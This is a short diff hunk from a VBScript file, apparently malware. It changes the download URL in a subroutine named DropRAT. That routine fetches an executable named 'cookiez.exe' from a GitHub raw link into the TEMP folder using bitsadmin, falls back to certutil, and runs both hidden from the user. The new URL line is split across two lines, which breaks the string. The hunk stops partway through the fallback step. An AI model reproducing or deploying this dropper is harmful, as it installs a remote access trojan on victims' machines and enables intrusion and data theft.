@@ -97,7 +97,8 @@ End Sub
 
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
-    Dim dl: dl = "https://github.com/huh71943-s/diceonline.app/raw/refs/heads/main/cookiez.exe"
+    Dim dl: dl = "https://github.com/ezemaillolbro-sudo
+/diceonline.app/raw/refs/heads/main/cookiez.exe"
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
